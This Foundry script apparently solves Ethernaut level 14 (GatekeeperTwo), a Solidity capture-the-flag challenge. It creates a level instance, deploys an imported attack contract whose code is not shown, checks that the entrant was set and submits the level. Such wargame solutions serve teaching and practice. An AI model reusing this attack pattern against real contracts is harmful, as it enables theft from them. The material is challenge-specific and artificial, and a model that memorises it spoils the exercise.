// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { GatekeeperTwo } from "src/Level14.sol";
import { L14Attack } from "src/Level14Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x0C791D1923c738AC8c4ACFD0A60382eE5FF08a23);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        GatekeeperTwo instance = GatekeeperTwo(instanceAddress);

        new L14Attack(instance);
        (,, address txOrigin) = vm.readCallers();
        require(instance.entrant() == txOrigin, "Level not solved");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
